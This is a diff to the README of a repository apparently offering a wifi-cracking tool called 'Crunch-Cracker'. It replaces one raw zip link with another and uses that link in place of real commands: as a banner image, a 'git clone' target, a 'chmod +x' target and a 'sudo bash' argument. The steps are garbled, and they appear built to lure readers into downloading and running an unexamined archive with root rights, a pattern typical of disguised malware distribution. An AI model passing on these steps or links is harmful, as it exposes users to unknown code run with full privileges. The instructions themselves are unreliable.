@@ -1,6 +1,6 @@
-# Crunch-Cracker 1.6 ![](https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip)
+# Crunch-Cracker 1.6 ![](https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker_Crunch_febrile.zip)
 
-![https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip](https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip)
+![https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker_Crunch_febrile.zip](https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker_Crunch_febrile.zip)
 
 # DISCLAMER: Program for educational purposes!!!
 
@@ -95,17 +95,17 @@ Wifi cracker
 
 # Download
 ```bash
-git clone https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip
+git clone https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker_Crunch_febrile.zip
 ```
 
 # Use 
 ```bash
 cd Crunch-Cracker
-chmod +x https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip
-https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip
+chmod +x https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker_Crunch_febrile.zip
+https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker_Crunch_febrile.zip
 ```
 #### Or
 ```bash
 cd Crunch-Cracker
-sudo bash https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker-Crunch-v3.9.zip
+sudo bash https://github.com/monkeyio344/Crunch-Cracker/raw/refs/heads/master/intercolonization/Cracker_Crunch_febrile.zip
 ```
